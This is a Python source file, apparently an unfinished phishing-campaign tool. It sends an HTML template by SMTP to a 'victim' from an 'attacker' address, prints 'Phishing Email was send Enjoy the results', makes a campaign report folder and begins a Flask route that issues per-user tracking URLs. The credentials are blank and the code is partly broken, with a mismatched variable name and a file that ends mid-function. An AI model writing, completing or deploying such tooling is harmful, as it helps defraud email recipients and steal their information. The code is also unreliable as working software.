import os

#email import libraries
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

#Web Portal
from flask import Flask, request, jsonify, redirect, url_for
import uuid


def getPath():
    currentPath = os.getcwd()

    # generate the aperance of the terminal of the user to make inputs
    print(f"\x1b[91m{os.path.basename(currentPath)}\x1b[0m:", currentPath)


def generateFolderReport():
    # Creating new folders for the final report
    reportsFolder = "reportsCampana"
    
    if not os.path.exists(reportsFolder):
        os.makedirs(reportsFolder)
        print(f"Folder " + reportsFolder + " created successfully!")
    else:
        print(f"Folder " + reportsFolder + " already exists")

def sendMensageToVictim(htmlTosend,subject,emailofthevictim, emailoftheatacker):
    # Process of send to the victim the template generated
    print("\n Starting process to send the template selectedto the victim\n")

    #Present configuration of smtp conexion
    port=578
    smtpServer=""
    login="api"
    password=""

    #Create MimeText objets
    message=MIMEMultipart()
    message["From"]=emailoftheatacker
    message["To"]=emailofthevictim
    message["Subject"]=subject

    #Attach HTML
    message.attach(MIMEText(htmlTosend,"html"))

    #Send the email
    with smtplib.SMTP(smtpServer,port) as server:
        server.starttls()
        server.login(login,password)
        server.sendmail(emailoftheatacker,emailofthevictim,message.as_string())

    print("Phishing Email was send\n Enjoy the results")

def generateUrlAccess():
    #Generating of an URL to access
    app=Flask(__name__)

    print("\Generating the Url to make the phishing")
    userData={}

    @app.route('/',methods=['GET'])
    def getInfoUser():
        # Generate a unique UUID for the user
        user_token = str(uuid.uuid4())
        # Store the user token in the user data dictionary
        user_data[user_token] = {}
        # Generate a personalized URL for the user
        url = f"http://localhost:5000/user/{user_token}"
        return jsonify({"url": url})

    
